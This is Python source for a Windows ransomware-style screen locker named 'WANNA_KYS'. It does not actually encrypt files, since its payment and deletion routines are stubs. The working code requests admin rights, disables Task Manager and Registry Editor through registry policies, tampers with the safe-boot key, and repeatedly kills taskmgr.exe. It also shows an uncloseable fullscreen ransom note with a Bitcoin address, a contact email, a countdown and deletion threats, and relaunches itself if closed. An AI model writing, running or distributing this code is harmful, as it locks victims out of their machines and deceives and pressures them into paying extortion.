import tkinter as tk
from tkinter import messagebox
import threading
import time
import os
import sys
import ctypes
from datetime import datetime, timedelta
import winreg
import subprocess
import psutil
import random
import hashlib
import platform
import urllib.request
import json
from pathlib import Path


class UncloseableRansomwareGUI:
    def __init__(self):
        self.window = tk.Tk()
        self.window.title("WANNA_KYS - YOUR FILES ARE ENCRYPTED")
        self.window.configure(bg='black')

        # Make completely uncloseable
        self.window.protocol("WM_DELETE_WINDOW", self.on_attempt_close)
        self.window.bind("<Alt-F4>", self.on_attempt_close)
        self.window.bind("<Escape>", self.on_attempt_close)
        self.window.bind("<Control-w>", self.on_attempt_close)
        self.window.bind("<Control-q>", self.on_attempt_close)

        # Fullscreen and always on top
        self.window.attributes('-fullscreen', True)
        self.window.attributes('-topmost', True)

        # Remove window decorations
        self.window.overrideredirect(True)

        # Prevent minimizing
        self.window.resizable(False, False)

        # Countdown settings
        self.end_time = datetime.now() + timedelta(hours=72)
        self.price = 500
        self.bitcoin_address = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
        self.email = "wannakys@protonmail.com"
        self.machine_id = self.generate_machine_id()

        # Save machine ID to registry
        self.save_machine_id()

        # Disable system functions
        self.disable_system()

        # Setup UI
        self.setup_ui()

        # Start threads
        self.start_countdown_thread()
        self.start_watchdog_thread()
        self.start_anti_close_thread()
        self.start_payment_checker()

        # Set desktop wallpaper
        self.set_ransom_wallpaper()

    def generate_machine_id(self):
        try:
            # Try to get from registry first
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\WannaKYS", 0, winreg.KEY_READ)
            machine_id, _ = winreg.QueryValueEx(key, "MachineID")
            winreg.CloseKey(key)
            return machine_id
        except:
            # Generate new ID from hardware info
            info = platform.uname()
            unique_string = f"{info.node}{info.processor}{platform.machine()}"
            return hashlib.sha256(unique_string.encode()).hexdigest().upper()[:32]

    def save_machine_id(self):
        try:
            key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER,
                                     r"Software\WannaKYS", 0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, "MachineID", 0, winreg.REG_SZ, self.machine_id)
            winreg.CloseKey(key)
        except:
            pass

    def disable_system(self):
        try:
            # Disable Task Manager
            key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER,
                                     r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
                                     0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)

            # Disable Registry Editor
            key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER,
                                     r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
                                     0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)

            # Block safe mode
            try:
                key = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE,
                                         r"SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal",
                                         0, winreg.KEY_WRITE)
                winreg.SetValueEx(key, "(Default)", 0, winreg.REG_SZ, "")
                winreg.CloseKey(key)
            except:
                pass

        except Exception as e:
            print(f"Error disabling system: {e}")

    def on_attempt_close(self, event=None):
        # Flash red screen
        original_bg = self.window.cget('bg')
        self.window.configure(bg='red')
        self.window.update()

        # Play system beep
        for _ in range(3):
            ctypes.windll.user32.MessageBeep(0xFFFFFFFF)
            time.sleep(0.1)

        # Show warning message occasionally
        if random.random() < 0.3:
            self.show_warning_message()

        # Restore original background
        self.window.configure(bg=original_bg)

        return "break"

    def show_warning_message(self):
        # Create a popup warning
        popup = tk.Toplevel(self.window)
        popup.title("WARNING!")
        popup.configure(bg='red')
        popup.attributes('-topmost', True)

        # Center the popup
        popup_width = 400
        popup_height = 200
        screen_width = popup.winfo_screenwidth()
        screen_height = popup.winfo_screenheight()
        x = (screen_width - popup_width) // 2
        y = (screen_height - popup_height) // 2
        popup.geometry(f'{popup_width}x{popup_height}+{x}+{y}')

        # Add warning text
        label = tk.Label(popup,
                         text="ATTEMPTING TO CLOSE WINDOW!\n\n" +
                              "Any further attempts will trigger\n" +
                              "PERMANENT FILE DELETION!",
                         fg='white', bg='red',
                         font=('Arial', 14, 'bold'))
        label.pack(expand=True, fill='both', padx=20, pady=20)

        # Auto-close after 3 seconds
        popup.after(3000, popup.destroy)

    def setup_ui(self):
        # Main frame
        main_frame = tk.Frame(self.window, bg='black')
        main_frame.pack(fill=tk.BOTH, expand=True, padx=50, pady=30)

        # Title
        title = tk.Label(main_frame,
                         text="WANNA_KYS RANSOMWARE",
                         fg='#ff0000', bg='black',
                         font=('Arial', 36, 'bold'))
        title.pack(pady=10)

        # Subtitle
        subtitle = tk.Label(main_frame,
                            text="YOUR COMPUTER HAS BEEN ENCRYPTED",
                            fg='#ff0000', bg='black',
                            font=('Arial', 24))
        subtitle.pack(pady=5)

        # Separator
        separator = tk.Frame(main_frame, height=2, bg='#ff0000')
        separator.pack(fill='x', pady=20)

        # Info box
        info_frame = tk.Frame(main_frame, bg='#111111', bd=2, relief=tk.RIDGE)
        info_frame.pack(fill=tk.BOTH, expand=True, pady=20, padx=20)

        info_text = f"""
╔══════════════════════════════════════════════════════════════════════╗
║                         WHAT HAPPENED?                               ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║  • All your personal files have been encrypted with military-grade   ║
║    AES-256 encryption                                                ║
║  • Your documents, photos, videos, databases, and other files are    ║
║    no longer accessible                                              ║
║  • The decryption key is stored on our secure servers and will be    ║
║    deleted after 72 hours                                            ║
║                                                                      ║
╠══════════════════════════════════════════════════════════════════════╣
║                         YOUR MACHINE ID                              ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║  {self.machine_id}                                                   ║
║                                                                      ║
╠══════════════════════════════════════════════════════════════════════╣
║                    HOW TO RECOVER YOUR FILES                         ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║  1. Send ${self.price} in Bitcoin to:                                ║
║     {self.bitcoin_address}                                           ║
║                                                                      ║
║  2. Email your Machine ID and payment proof to:                      ║
║     {self.email}                                                     ║
║                                                                      ║
║  3. You will receive the decryption tool within 24 hours             ║
║                                                                      ║
╠══════════════════════════════════════════════════════════════════════╣
║                          WARNING!                                    ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║  • DO NOT restart your computer - system bootloader is corrupted     ║
║  • DO NOT try to remove this program - files will be deleted         ║
║  • DO NOT use recovery software - it will damage encrypted files     ║
║  • Time is limited! After 72 hours, price doubles to $1000           ║
║  • After 7 days, decryption key is destroyed FOREVER                 ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
        """

        info_label = tk.Label(info_frame, text=info_text,
                              fg='#ffffff', bg='#111111',
                              font=('Consolas', 10), justify=tk.LEFT)
        info_label.pack(padx=20, pady=20)

        # Countdown display
        self.countdown_var = tk.StringVar()
        self.countdown_var.set("⏳ TIME REMAINING: 72:00:00:00")
        countdown_label = tk.Label(main_frame,
                                   textvariable=self.countdown_var,
                                   fg='#ffff00', bg='black',
                                   font=('Courier New', 18, 'bold'))
        countdown_label.pack(pady=20)

        # Payment status
        self.payment_var = tk.StringVar(value="❌ PAYMENT STATUS: NOT RECEIVED")
        payment_label = tk.Label(main_frame,
                                 textvariable=self.payment_var,
                                 fg='#ff0000', bg='black',
                                 font=('Arial', 14, 'bold'))
        payment_label.pack(pady=10)

        # Button frame
        button_frame = tk.Frame(main_frame, bg='black')
        button_frame.pack(pady=20)

        # Test decryption button
        test_btn = tk.Button(button_frame,
                             text="🔓 TEST DECRYPTION (1 Free File)",
                             command=self.fake_decryption_test,
                             bg='#333333', fg='white',
                             font=('Arial', 12),
                             padx=20, pady=10,
                             cursor='hand2')
        test_btn.pack(side=tk.LEFT, padx=10)

        # Verify payment button
        verify_btn = tk.Button(button_frame,
                               text="✅ VERIFY PAYMENT",
                               command=self.verify_payment,
                               bg='#333333', fg='white',
                               font=('Arial', 12),
                               padx=20, pady=10,
                               cursor='hand2')
        verify_btn.pack(side=tk.LEFT, padx=10)

        # Footer warning
        footer = tk.Label(main_frame,
                          text="⚠️ THIS WINDOW CANNOT BE CLOSED - SYSTEM IS PERMANENTLY LOCKED ⚠️",
                          fg='#ff0000', bg='black',
                          font=('Arial', 10, 'bold'))
        footer.pack(pady=10)

    def start_countdown_thread(self):
        def countdown():
            while True:
                remaining = self.end_time - datetime.now()

                if remaining.total_seconds() <= 0:
                    self.countdown_var.set("⏰ TIME EXPIRED! PRICE DOUBLED TO $1000")
                    self.price = 1000

                    # Start file deletion thread if expired for 24 hours
                    if remaining.total_seconds() < -86400:
                        threading.Thread(target=self.start_file_deletion, daemon=True).start()
                else:
                    days = remaining.days
                    hours, remainder = divmod(remaining.seconds, 3600)
                    minutes, seconds = divmod(remainder, 60)

                    time_str = f"⏳ TIME REMAINING: {days:02d}:{hours:02d}:{minutes:02d}:{seconds:02d}"
                    self.countdown_var.set(time_str)

                time.sleep(1)

        threading.Thread(target=countdown, daemon=True).start()

    def start_watchdog_thread(self):
        def watchdog():
            while True:
                time.sleep(2)

                # Bring window to front
                self.window.lift()
                self.window.attributes('-topmost', True)

                # Kill task manager if running
                for proc in psutil.process_iter(['name']):
                    try:
                        if proc.info['name'] and proc.info['name'].lower() == 'taskmgr.exe':
                            proc.kill()
                    except:
                        pass

                time.sleep(3)

        threading.Thread(target=watchdog, daemon=True).start()

    def start_anti_close_thread(self):
        def anti_close():
            while True:
                # Block Alt+Tab, Windows key, etc.
                try:
                    # This would require low-level keyboard hooks in a real implementation
                    pass
                except:
                    pass

                time.sleep(1)

        threading.Thread(target=anti_close, daemon=True).start()

    def start_payment_checker(self):
        def check_payment():
            while True:
                # In real ransomware, this would contact a C2 server
                # For demo, just simulate random "payment received"
                if random.random() < 0.01:  # 1% chance per check
                    self.payment_var.set("✅ PAYMENT CONFIRMED! Decrypting files...")
                    # Start fake decryption process
                    threading.Thread(target=self.start_fake_decryption, daemon=True).start()

                time.sleep(60)  # Check every minute

        threading.Thread(target=check_payment, daemon=True).start()

    def fake_decryption_test(self):
        # Create fake decryption window
        test_win = tk.Toplevel(self.window)
        test_win.title("Test Decryption")
        test_win.configure(bg='#222222')
        test_win.attributes('-topmost', True)
        test_win.geometry("400x200")

        # Center the window
        test_win.update_idletasks()
        width = test_win.winfo_width()
        height = test_win.winfo_height()
        x = (test_win.winfo_screenwidth() // 2) - (width // 2)
        y = (test_win.winfo_screenheight() // 2) - (height // 2)
        test_win.geometry(f'{width}x{height}+{x}+{y}')

        tk.Label(test_win, text="Testing decryption on 1 random file...",
                 bg='#222222', fg='white',
                 font=('Arial', 12)).pack(pady=30)

        # Progress bar
        try:
            from tkinter import ttk
            progress = ttk.Progressbar(test_win, length=300, mode='indeterminate')
            progress.pack(pady=10)
            progress.start()
        except:
            pass

        # After 5 seconds, show failure
        def show_failure():
            try:
                if 'progress' in locals():
                    progress.stop()
            except:
                pass

            test_win.destroy()
            messagebox.showerror("Decryption Failed",
                                 "Test decryption unsuccessful.\n" +
                                 "Full payment required for complete file recovery.")

        test_win.after(5000, show_failure)

    def verify_payment(self):
        messagebox.showinfo("Verify Payment",
                            f"To verify payment, email:\n"
                            f"From: Any email address\n"
                            f"To: {self.email}\n"
                            f"Subject: Payment Verification - {self.machine_id}\n"
                            f"Body: Include Bitcoin transaction ID")

    def start_fake_decryption(self):
        # Fake decryption process
        pass

    def start_file_deletion(self):
        # Start deleting files after expiration
        def delete_files():
            # This would delete encrypted files in real ransomware
            pass

        threading.Thread(target=delete_files, daemon=True).start()

    def set_ransom_wallpaper(self):
        try:
            # Set black wallpaper with ransom text
            import tempfile

            # Create a simple BMP file
            width = 1920
            height = 1080

            # BMP header
            bmp_header = bytearray([
                0x42, 0x4D, 0x36, 0x00, 0x0C, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x36, 0x00, 0x00, 0x00, 0x28, 0x00, 0x00, 0x00,
                width & 0xFF, (width >> 8) & 0xFF, (width >> 16) & 0xFF, (width >> 24) & 0xFF,
                height & 0xFF, (height >> 8) & 0xFF, (height >> 16) & 0xFF, (height >> 24) & 0xFF,
                0x01, 0x00, 0x18, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x0C, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00
            ])

            # Create black pixels
            pixels = bytearray(width * height * 3)
            for i in range(0, len(pixels), 3):
                pixels[i] = 0  # Blue
                pixels[i + 1] = 0  # Green
                pixels[i + 2] = 0  # Red

            # Combine header and pixels
            bmp_data = bmp_header + pixels

            # Save to temp file
            temp_dir = tempfile.gettempdir()
            wallpaper_path = os.path.join(temp_dir, "wannakys_wallpaper.bmp")

            with open(wallpaper_path, 'wb') as f:
                f.write(bmp_data)

            # Set as wallpaper
            SPI_SETDESKWALLPAPER = 0x14
            ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, wallpaper_path, 3)

        except Exception as e:
            print(f"Error setting wallpaper: {e}")

    def run(self):
        # Start main loop
        try:
            self.window.mainloop()
        except:
            # If window is somehow closed, restart it
            os.startfile(__file__)


def check_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def main():
    # Check if running as admin
    if not check_admin():
        # Re-run as admin
        try:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
        except:
            pass
        sys.exit()

    # Create and run GUI
    app = UncloseableRansomwareGUI()
    app.run()


if __name__ == "__main__":
    main()
